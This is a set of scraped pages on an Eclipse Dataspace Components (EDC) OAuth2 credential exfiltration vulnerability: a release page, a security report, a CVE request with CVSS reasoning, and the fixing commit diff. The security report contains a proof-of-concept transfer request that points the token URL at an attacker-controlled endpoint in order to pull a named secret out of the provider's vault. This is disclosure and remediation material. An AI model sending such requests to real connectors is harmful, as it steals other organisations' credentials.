=== Content from github.com_79c79812_20250111_161811.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-edc%2FConnector%2Freleases%2Ftag%2Fv0.6.3)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-edc%2FConnector%2Freleases%2Ftag%2Fv0.6.3)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=eclipse-edc%2FConnector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-edc](/eclipse-edc)
/
**[Connector](/eclipse-edc/Connector)**
Public

* [Notifications](/login?return_to=%2Feclipse-edc%2FConnector) You must be signed in to change notification settings
* [Fork
  245](/login?return_to=%2Feclipse-edc%2FConnector)
* [Star
   294](/login?return_to=%2Feclipse-edc%2FConnector)

* [Code](/eclipse-edc/Connector/tree/v0.6.3)
* [Issues
  27](/eclipse-edc/Connector/issues)
* [Pull requests
  5](/eclipse-edc/Connector/pulls)
* [Discussions](/eclipse-edc/Connector/discussions)
* [Actions](/eclipse-edc/Connector/actions)
* [Projects
  0](/eclipse-edc/Connector/projects)
* [Security](/eclipse-edc/Connector/security)
* [Insights](/eclipse-edc/Connector/pulse)

Additional navigation options

* [Code](/eclipse-edc/Connector/tree/v0.6.3)
* [Issues](/eclipse-edc/Connector/issues)
* [Pull requests](/eclipse-edc/Connector/pulls)
* [Discussions](/eclipse-edc/Connector/discussions)
* [Actions](/eclipse-edc/Connector/actions)
* [Projects](/eclipse-edc/Connector/projects)
* [Security](/eclipse-edc/Connector/security)
* [Insights](/eclipse-edc/Connector/pulse)

1. [Releases](/eclipse-edc/Connector/releases)
2. [v0.6.3](/eclipse-edc/Connector/releases/tag/v0.6.3)

# v0.6.3

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/eclipse-edc/Connector/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.6.3)

 Loading

[View all tags](/eclipse-edc/Connector/tags)

![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)
[github-actions](/apps/github-actions)
released this
06 May 08:34

·
[310 commits](/eclipse-edc/Connector/compare/v0.6.3...main)
to main
since this release

[v0.6.3](/eclipse-edc/Connector/tree/v0.6.3)

[`a2e2822`](/eclipse-edc/Connector/commit/a2e28228175c94cddd14d9bcbd203ea1720829bc)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.

GPG key ID: B5690EEEBB952194

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

## What's Changed

### Bugfixes

* chore: add checks on SI token issuer vs VP issuer by [@wolf4ood](https://github.com/wolf4ood) in [#4140](https://github.com/eclipse-edc/Connector/pull/4140)
* fix: correct DataService json-ld attributes by [@ndr-brt](https://github.com/ndr-brt) in [#4146](https://github.com/eclipse-edc/Connector/pull/4146)
* chore: removes OAuth2 capabilities from the data sink by [@wolf4ood](https://github.com/wolf4ood) in [#4152](https://github.com/eclipse-edc/Connector/pull/4152)
* fix: remove unused parentPermission field that caused stack overflow exceptions by [@ndr-brt](https://github.com/ndr-brt) in [#4155](https://github.com/eclipse-edc/Connector/pull/4155)
* fix: issuanceDate fallback in vc transformer by [@lholthof](https://github.com/lholthof) in [#4159](https://github.com/eclipse-edc/Connector/pull/4159)

### New Features & Improvements

* feat: make TransferRequest transferType mandatory and dataDestination optional by [@ndr-brt](https://github.com/ndr-brt) in [#4119](https://github.com/eclipse-edc/Connector/pull/4119)
* fix: removes LockManager in favour of ConcurrentHashMap by [@wolf4ood](https://github.com/wolf4ood) in [#4142](https://github.com/eclipse-edc/Connector/pull/4142)
* feat(dsp): support implicit Offer policy type by [@ndr-brt](https://github.com/ndr-brt) in [#4143](https://github.com/eclipse-edc/Connector/pull/4143)

### Dependencies

* build(deps): bump jakarta.ws.rs:jakarta.ws.rs-api from 3.1.0 to 4.0.0 by [@dependabot](https://github.com/dependabot) in [#4153](https://github.com/eclipse-edc/Connector/pull/4153)
* build(deps): bump bouncyCastle-jdk18on from 1.78 to 1.78.1 by [@dependabot](https://github.com/dependabot) in [#4122](https://github.com/eclipse-edc/Connector/pull/4122)

### Other Changes

* refactor: cleanup deprecations from 0.2.x by [@ndr-brt](https://github.com/ndr-brt) in [#4139](https://github.com/eclipse-edc/Connector/pull/4139)

**Full Changelog**: [v0.6.2...v0.6.3](https://github.com/eclipse-edc/Connector/compare/v0.6.2...v0.6.3)

### Contributors

* [![@wolf4ood](https://avatars.githubusercontent.com/u/98812?s=64&v=4)](https://github.com/wolf4ood)
* [![@ndr-brt](https://avatars.githubusercontent.com/u/8570990?s=64&v=4)](https://github.com/ndr-brt)
* [![@dependabot](https://avatars.githubusercontent.com/u/27347476?s=64&v=4)](https://github.com/dependabot)
* [![@lholthof](https://avatars.githubusercontent.com/u/68239695?s=64&v=4)](https://github.com/lholthof)

wolf4ood, ndr-brt, and 2 other contributors

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gitlab.eclipse.org_2f07bfeb_20250111_161812.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability

## Basic information

**Project name:** Eclipse EDC

**Project id:** technology.edc

## Details of the issue

Reported on the security ML:

We have identified a security vulnerability in the EDC project (<https://github.com/eclipse-edc/Connector>) version 0.2.1 (at least down to version MS8) regarding the OAuth2-protected data sink feature which we rate with at a 9.3/10 CRITICAL CVSS v4.0 score. This project is also used in the Eclipse project (<https://github.com/eclipse-tractusx/tractusx-edc>) where we can verify the vulnerability at least for release 0.5.4. As we have identified a [recent code change](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244) in Tractus-X EDC that now allows to exploit the vulnerability by default, we prioritized disclosure over further deeper analysis and reproducibility of latest released versions, since we want to avoid any negative impact including reputation on the young projects and data space initiatives like Catena-X. To our opinion (concluded by a first review of the current code) the vulnerability most probably persists for Connector version 0.6.2 and Tractus-X EDC version 0.7.0

When using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider's vault, not the consumer. This secret's value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.

### Details

The vulnerability is twofold, but the core issue is that the provider data plane resolves clientSecretKeys specified in data sink data addresses provided by consumers. This means that a malicious consumer can induce the provider to load any known secret from the provider's vault and use it as an OAuth2 client secret, with the resulting token being sent to the consumer-controlled data sink. This alone already allows significant credential exfiltration: If a malicious consumer knows that the client secret for a known client ID is stored at a known vault key, e.g., because the provider themself has an OAuth2-protected data source, the consumer can harvest the resulting access token from their data sink and use it to authorize against such protected resource that should only be accessible by the provider.

The second part is that the tokenUrl, to which the provider submits the resolved credentials to retrieve an access token, is also controlled by the consumer. With the previously described attack, it was only possible to exfiltrate OAuth2 access tokens, which are usually short-lived and require the attacker to know the corresponding client ID and token URL. However, by providing an attacker-controlled endpoint as the tokenUrl, the attacker can exfiltrate arbitrary secrets from the provider's vault, as the provider data plane will send the resolved secret to that endpoint as part of an OAuth2 client credentials grant. This allows exfiltration of longer-lived secrets like OAuth2 client secret, cryptographic keys, etc. Notably, compared to the first attack, an attacker needs significantly less information to conduct this attack; they only need to know the desired secret's name ("key") in the secrets vault.

The latter problem is exacerbated by the fact that third-party integrations, like the [Simple Data Exchanger](https://github.com/eclipse-tractusx/managed-simple-data-exchanger-backend/blob/v2.3.6/modules/sde-external-services/edc/src/main/java/org/eclipse/tractusx/sde/edc/entities/request/asset/AssetEntryRequestFactory.java#L109), a Catena-X component, also under stewardship of the Eclipse Tractus-X project, that integrates with the EDC, may require certain secrets to be created with fixed names. Therefore, if an attacker knows such applications are in use, they know the corresponding secret is likely to exist, making it a prime target for exfiltration. Alternatively, dictionary attacks and brute force may be viable approaches to extract other secrets that may or may not exist.
Technical Description

This issue has been reproduced in core-EDC version 0.2.1. It arises if the data-plane-http-oauth2 extension is used with the [ProviderPushTransferDataFlowController](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/control-plane/transfer/transfer-data-plane/src/main/java/org/eclipse/edc/connector/transfer/dataplane/flow/ProviderPushTransferDataFlowController.java) of the transfer-data-plane Extension. The [Oauth2HttpRequestParamsDecorator](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2HttpRequestParamsDecorator.java) will be invoked for both [SourceDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L58) as well as [DestinationDataAddress](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java#L66) in the [HttpRequestParamsProviderImpl](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http/src/main/java/org/eclipse/edc/connector/dataplane/http/params/HttpRequestParamsProviderImpl.java), executed by the provider data-plane. When [building the Oauth2CredentialsRequest in the Oauth2CredentialsRequestFactory](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L68) the [vault is invoked](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/Oauth2CredentialsRequestFactory.java#L90) to resolve the secret from the passed DataAddress. It is also invoked for the DestinationDataAddress, which is passed by the consumer and can be manipulated by an attacker. An attacker can freely choose the alias to be resolved in the "oauth2:clientSecretKey" property. The resolved secret is then sent to the URL specified in the "oauth2:tokenUrl" property.

The issue can be resolved by removing the Oauth2HttpRequestParamsDecorator for Sinks in the [DataPlaneHttpOauth2Extension](https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61). However, this would lead to removing the OAuth2 feature for sinks using push transfers.
Impact

Given an EDC instance with a single publicly available contract definition, the described attack allows any attacker in the same data space as the target to exfiltrate arbitrary secrets from the target's secrets vault, including internal credentials, such as those for authentication via SSI/MIW or DAPS.

We have assessed this vulnerability at a 9.3/10 CRITICAL CVSS v4.0 score. CVSS vector: [CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H/AU:Y/R:U/V:C/RE:H/U:Red)
Weaknesses

```
[CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data
[CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials
```

### Affected versions and configurations

We have tested against version 0.5.4 of the [Tractus-X EDC distribution](https://github.com/eclipse-tractusx/tractusx-edc/tree/0.5.4), based on version 0.2.1 of the [core EDC](https://github.com/eclipse-edc/Connector). To deploy the Tractus-X EDC, we used the Helm chart contained in the repository itself. To reproduce the issue, we had to enable HttpData in the destination types by adding it to the environment variable EDC\_DATAPLANE\_SELECTOR\_DEFAULTPLANE\_DESTINATIONTYPES in the control plane. Its final value was HttpProxy,AmazonS3,HttpData, with the first two being the default value set by the chart itself. Notably, this change was recently made default in pull request [#1244](https://github.com/eclipse-tractusx/tractusx-edc/pull/1244).

We were unfortunately unable to test against latest core EDC versions. However, we have inspected the code and relevant portions have not been modified since, so we believe the issue may still be present in current versions.
Mitigation

Until fixes are made available, the following mitigation approaches exist:

```
Disable support for OAuth2-protected data sinks entirely
Employ WAF solutions to reject requests containing clientSecretKeys
Include a cryptographically secure random component in each secret name in the secrets vaults
Ensure all available contract definitions can only be consumed by trusted consumers
Disable data plane secrets vault access entirely (may break other functionality)
```

### Disabling of OAuth2-protected data sinks

If recompiling the EDC from source is an option, then removing this line of code will alleviate the vulnerability: <https://github.com/eclipse-edc/Connector/blob/v0.2.1/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java#L61>
Proof of Concept

```
Provider (attack target): create publicly available contract definition
Consumer (attacker)
    Negotiate contract for previously created contract definition
    Initiate transfer to OAuth2-protected data sink For that, send a POST request to /v2/transferprocesses of the consuming connector's management API with the following body. json { "@type": https://w3id.org/edc/v0.0.1/ns/TransferRequest, https://w3id.org/edc/v0.0.1/ns/assetId: "{{ASSET_ID}}", https://w3id.org/edc/v0.0.1/ns/contractId: "{{CONTRACT_ID}}", https://w3id.org/edc/v0.0.1/ns/connectorAddress: "{{PROVIDER_EDC_DSP_ENDPOINT}}", https://w3id.org/edc/v0.0.1/ns/connectorId: "{{PROVIDER_EDC_PARTICIPANT_ID}}", https://w3id.org/edc/v0.0.1/ns/dataDestination: { https://w3id.org/edc/v0.0.1/ns/type: "HttpData", https://w3id.org/edc/v0.0.1/ns/baseUrl: "{{attacker_controlled_endpoint}}", "oauth2:tokenUrl": "{{attacker_controlled_endpoint}}", "oauth2:clientId": "example", "oauth2:clientSecretKey": "{{target_vault_secret_key}}" }, https://w3id.org/edc/v0.0.1/ns/properties: {}, https://w3id.org/edc/v0.0.1/ns/privateProperties: {}, https://w3id.org/edc/v0.0.1/ns/protocol: "dataspace-protocol-http", https://w3id.org/edc/v0.0.1/ns/managedResources: false }
```

After initiating the transfer, the selected secret will be sent to the {{attacker\_controlled\_endpoint}} as the client\_secret paramater of an application/x-www-form-urlencoded POST request.

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Copyright © Eclipse Foundation, Inc. All Rights Reserved.     [Privacy Policy](https://www.eclipse.org/legal/privacy.php) | [Terms of Use](https://www.eclipse.org/legal/termsofuse.php) | [Copyright Agent](https://www.eclipse.org/legal/copyright.php)



=== Content from gitlab.eclipse.org_591f2b86_20250111_161812.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# Eclipse EDC: OAuth2 Credential Exfiltration Vulnerability

The Eclipse Foundation is a [Common Vulnerabilities and Exposures](https://cve.mitre.org/) (CVE) Numbering Authority. This issue it used to request and track the progress of the assignment of a CVE for a vulnerability in the project code for an Eclipse open source project.

## Basic information

**Project name:** Eclipse Dataspace Components

**Project id:** technology.edc

**Request type:** publication

**Versions affected:** [0.2.1, 0.6.2]

**Common Weakness Enumeration:**

* [CWE-201](https://cwe.mitre.org/data/definitions/201.html): Insertion of Sensitive Information Into Sent Data
* [CWE-522](https://cwe.mitre.org/data/definitions/522.html): Insufficiently Protected Credentials

**Common Vulnerability Scoring System:** {[cvss](https://nvd.nist.gov/vuln-metrics/cvss)}

6.9

CVSS:4.0/AV:A/AC:H/AT:P/PR:H/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N/AU:Y/V:D/RE:L/U:Amber

**Exploitable Metrics**

* *Attack Vector*: Adjacent, because attackers have to be part of a dataspace, such as Catena-x, which is not the general public internet. A comparison to a VPN is not unreasonable.
* *Attack Complexity*: High, because an attacker has to go through a contract negotiation, and a transfer process *per guess*.
* *Attack Requirements*: Present, because there has to be some infrastructure and pre-existing setup in place, like onboarding
* *Privileges required*: attacker has to be a legit member of a dataspace, and they have to fulfill all requirements (Policies) imposed by the provider
* *User Interaction*: not required.

**Vulnerable System Impact Metrics**

* *Confidentiality*: High, as leaking private keys could allow an attacker to pose as the provider
* *Integrity*: Low, because no modification of data is possible, if downstream systems such as databases are configured properly (i.e. without internet access)
* *Availability*: Low, because the reachability/availability is not affected

**Subsequent System Impact Metrics**

* *Confidentiality*: *not disputed*
* *Integrity*: downstream systems cannot be modified by this vulnerability
* *Availability*: not affected

**Supplemental Metrics**

* *Value Density*: every exploit event gives access to exactly one value, i.e. secret stored in the vault
* *Vulnerability Response Effort*: Low, because it is sufficient to disable `Http-PUSH` from the dataplane config, or remove the OAuth2 module from the build file
* *Provider Urgency*: Amber, as this exploit is not available in all combinations of modules and scenarios

**Summary:**

In Eclipse Dataspace Components from version 0.2.1 to 0.6.2, we have identified a security vulnerability in the EDC Connector component (<https://github.com/eclipse-edc/Connector>) regarding the OAuth2-protected data sink feature. When using a custom, OAuth2-protected data sink, the OAuth2-specific data address properties are resolved by the provider data plane. Problematically, the consumer-provided clientSecretKey, which indicates the OAuth2 client secret to retrieve from a secrets vault, is resolved in the context of the provider's vault, not the consumer. This secret's value is then sent to the tokenUrl, also consumer-controlled, as part of an OAuth2 client credentials grant. The returned access token is then sent as a bearer token to the data sink URL.

**Links:**

* {primary resolution link}

## Tracking

**This section will completed by the project team**.

* Reserve an entry only
* We're ready for this issue to be reported to the central authority (i.e., make this public now)

Note that for those projects that host their repositories on GitHub, the use of GitHub Security Advisories is recommended but is not required.

**This section will be completed by the EMO**.

**CVE:** {cve}

* All required information is provided
* CVE Assigned
* Pushed to Mitre
* Accepted by Mitre

Edited May 07, 2024 by [Marta Rybczynska](/mrybczyn)

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Copyright © Eclipse Foundation, Inc. All Rights Reserved.     [Privacy Policy](https://www.eclipse.org/legal/privacy.php) | [Terms of Use](https://www.eclipse.org/legal/termsofuse.php) | [Copyright Agent](https://www.eclipse.org/legal/copyright.php)



=== Content from github.com_c2df0acb_20250111_161810.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-edc%2FConnector%2Fcommit%2Fa4e6018d2c0457fba6f672fafa6c590513c45d1b)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-edc%2FConnector%2Fcommit%2Fa4e6018d2c0457fba6f672fafa6c590513c45d1b)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=eclipse-edc%2FConnector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-edc](/eclipse-edc)
/
**[Connector](/eclipse-edc/Connector)**
Public

* [Notifications](/login?return_to=%2Feclipse-edc%2FConnector) You must be signed in to change notification settings
* [Fork
  245](/login?return_to=%2Feclipse-edc%2FConnector)
* [Star
   294](/login?return_to=%2Feclipse-edc%2FConnector)

* [Code](/eclipse-edc/Connector)
* [Issues
  27](/eclipse-edc/Connector/issues)
* [Pull requests
  5](/eclipse-edc/Connector/pulls)
* [Discussions](/eclipse-edc/Connector/discussions)
* [Actions](/eclipse-edc/Connector/actions)
* [Projects
  0](/eclipse-edc/Connector/projects)
* [Security](/eclipse-edc/Connector/security)
* [Insights](/eclipse-edc/Connector/pulse)

Additional navigation options

* [Code](/eclipse-edc/Connector)
* [Issues](/eclipse-edc/Connector/issues)
* [Pull requests](/eclipse-edc/Connector/pulls)
* [Discussions](/eclipse-edc/Connector/discussions)
* [Actions](/eclipse-edc/Connector/actions)
* [Projects](/eclipse-edc/Connector/projects)
* [Security](/eclipse-edc/Connector/security)
* [Insights](/eclipse-edc/Connector/pulse)

## Commit

[Permalink](/eclipse-edc/Connector/commit/a4e6018d2c0457fba6f672fafa6c590513c45d1b)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

chore: removes OAuth2 capabilities from the data sink ([#4152](https://github.com/eclipse-edc/Connector/pull/4152))

[Browse files](/eclipse-edc/Connector/tree/a4e6018d2c0457fba6f672fafa6c590513c45d1b)
Browse the repository at this point in the history

```
* chore: removes OAuth2 capabilities from the data sink

* pr remarks
```

* Loading branch information

[![@wolf4ood](https://avatars.githubusercontent.com/u/98812?s=40&v=4)](/wolf4ood)

[wolf4ood](/eclipse-edc/Connector/commits?author=wolf4ood "View all commits by wolf4ood")
authored
May 3, 2024

1 parent
[4f33a48](/eclipse-edc/Connector/commit/4f33a48882df1d52fe024a79368b87bb835cbbd6)

commit a4e6018

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**47 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* extensions/data-plane/data-plane-http-oauth2-core/src

  + main/java/org/eclipse/edc/connector/dataplane/http/oauth2

    - extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java
      [DataPlaneHttpOauth2Extension.java](#diff-639e9fb628396cdb0a5faf1746b1fccea4607ace26cfd23def398526348bfa1a)
  + test/java/org/eclipse/edc/connector/dataplane/http/oauth2

    - extensions/data-plane/data-plane-http-oauth2-core/src/test/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2ExtensionTest.java
      [DataPlaneHttpOauth2ExtensionTest.java](#diff-94677e45aaf9ff7b19323578e04a6ae7e0bcc52dbf304563055efdee137cb85f)

## There are no files selected for viewing

1 change: 0 additions & 1 deletion

1
[...in/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java](#diff-639e9fb628396cdb0a5faf1746b1fccea4607ace26cfd23def398526348bfa1a "extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java")

Show comments

[View file](/eclipse-edc/Connector/blob/a4e6018d2c0457fba6f672fafa6c590513c45d1b/extensions/data-plane/data-plane-http-oauth2-core/src/main/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2Extension.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -58,7 +58,6 @@ public void initialize(ServiceExtensionContext context) { |
|  |  | var requestFactory = new Oauth2CredentialsRequestFactory(privateKeyResolver, clock, vault, context.getMonitor()); |
|  |  | var oauth2ParamsDecorator = new Oauth2HttpRequestParamsDecorator(requestFactory, oauth2Client); |
|  |  |  |
|  |  | paramsProvider.registerSinkDecorator(oauth2ParamsDecorator); |
|  |  | paramsProvider.registerSourceDecorator(oauth2ParamsDecorator); |
|  |  | } |
|  |  |  |
| Expand Down | |  |

47 changes: 47 additions & 0 deletions

47
[...ava/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2ExtensionTest.java](#diff-94677e45aaf9ff7b19323578e04a6ae7e0bcc52dbf304563055efdee137cb85f "extensions/data-plane/data-plane-http-oauth2-core/src/test/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2ExtensionTest.java")

Show comments

